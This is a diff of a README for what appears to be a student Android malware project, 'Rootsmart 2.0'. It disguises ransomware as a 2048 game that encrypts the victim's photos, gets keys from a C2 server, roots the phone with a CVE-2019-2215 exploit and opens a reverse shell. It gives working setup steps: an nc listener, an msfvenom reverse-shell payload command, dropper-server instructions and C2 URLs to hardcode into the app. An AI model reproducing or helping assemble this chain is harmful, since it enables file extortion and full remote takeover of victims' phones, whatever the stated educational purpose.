@@ -1,64 +1,71 @@
-# ICT2207 - Rootsmart 2.0 w/ cve-2019-2215 + Ransomware
+# Rootsmart 2.0 w/ cve-2019-2215 + Ransomware
+
+Disclaimer:
+This project is solely for educational purposes. 
 
 Attack Vector:
 
-References:
-- [Rootsmart analysis A](https://forensics.spreitzenbarth.de/2012/02/12/detailed-analysis-of-android-bmaster/)
-- [Rootsmart analysis B](https://resources.infosecinstitute.com/topic/rootsmart-android-malware/)
-- [Rootsmart analysis C](https://www.csc2.ncsu.edu/faculty/xjiang4/RootSmart/)
-- [Git - Dropper PoC](https://github.com/agentzex/The-Nice-Dropper)
-- [Git - cve-2019-2215](https://github.com/kangtastic/cve-2019-2215)
-- [Accessing Resources](https://mkyong.com/java/java-read-a-file-from-resources-folder/)
-- [Creating Assets Folder](https://stackoverflow.com/questions/18302603/where-to-place-the-assets-folder-in-android-studio)
-- [Run binary in asset folder A](https://stackoverflow.com/questions/5583487/hosting-an-executable-within-android-application)
-- [Run binary in asset folder B](http://gimite.net/en/index.php?Run%20native%20executable%20in%20Android%20App)
-- [Building jar via Gradle](https://linuxtut.com/en/0553b36f765548160bb3/)
+1. Install, run the application and grant permissions
+2. Ransomware will AES encrypt all files in /sdcard/Pictures
+3. Each file will be encrypted with a random generated key
+4. Keys will be stored in /sdcard/keys.json where each key:value pair is filepath:key
+5. GET HTTP to C2 server /get_mk to retrieve MasterKey and VictimID in response body
+6. MasterKey will encrypt keys.json, VictimID will be stored in /sdcard/victimID.txt
+7. The application will download shells.zip and unzip the contents
+8. Execute cve-2019-2215 binary from the unzipped contents
+9. A root shell process will be spawn and will run install.sh from the unzipped contents
+10. Install.sh will execute rs.elf from the unzipped contents to send a reverse connection to attack server
 
-1. Install Malware
-2. Run malware
-3. Download shells.zip from C2 and unzip to /data/data/com.google.android.\<app package name\>/files
-	- cve-2019-2215 binary
-	- install.sh
-	- ransomware.sh
-4. chmod 775 cve-2019-2215 (our root shell binary)
-5. exec install.sh to use cve-2019-2215 root shell and remount /system and then create other needed dir in filesystem
-6. exec ransomeware.sh which will download dex file and execute dex file via dalvikvm command [ref](https://gist.github.com/lifuzu/9918513)
 
 ---
 
-## Set up C2 server
+## C2 (Command & Control) - Setup
 For this test, ensure that the victim phone and the C2 server are in the same subnet (otherwise host C2 in public internet).
 
-Compressing CVE:
+Reverse Shell Server
 ```bash
-tar -czvf shells.tar.gz cve-2019-2215
+nc -lvnp 1337 # Ideally this should be the same IP as the dropper server
 ```
 
 Dropper Server
 ```bash
-# Better to run flask on Windows if WSL don't port forward localhost traffic to Windows Host
+# Generate rs.elf payload
+msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> -f elf > rs.elf
 
+# Better to run flask on Windows if WSL don't port forward localhost traffic to Windows Host
 cd dropper
-python3 -m venv venv
+python3 -m venv venv # Create venv
+
+# Activate venv
 . venv/bin/activate # Linux
 venv\Scripts\activate.bat # Windows
 pip install -r requirements.txt --upgrade pip # Make sure host shell is root/Administrator
+
+# Run C2 server
 python3 dropper_server.py # WSL
 python dropper_server.py # Windows
 ```
 
----
-## Android App
-- AndroidManifest.xml
-```xml
-<uses-permission android:name="android.permission.INTERNET"/>
-<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
-<uses-permission android:name="android.permission.WRITE_INTERNAL_STORAGE"/>
-<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+shells.zip in /dropper
+1. Go to dropper/cve-2019-2215 folder
+2. After creating rs.elf, zip rs.elf + cve-2019-2215, install.sh
+3. Rename zip file to shells.zip
+4. Move shells.zip to /dropper
 
-<application 
-	android:requestLegacyExternalStorage="true"
-    android:usesCleartextTraffic="true" >
+## Modify the following before compiling APK
+
+Java Classes
+```java
+// File : 2048-Game/app/src/main/java/aarkay/a2048game/Temproot.java
+// Change IP and port according to dropper server IP and port
+String URL = "http://192.168.157.73:8080/process_command"; // Line 20
+
+// File : 2048-Game/app/src/main/java/aarkay/a2048game/Encrypt.java
+// Change IP and port according to dropper server IP and port
+String URL = "http://192.168.157.73:8080/get_mk"; // Line 45
 ```
+
+
+
+
+
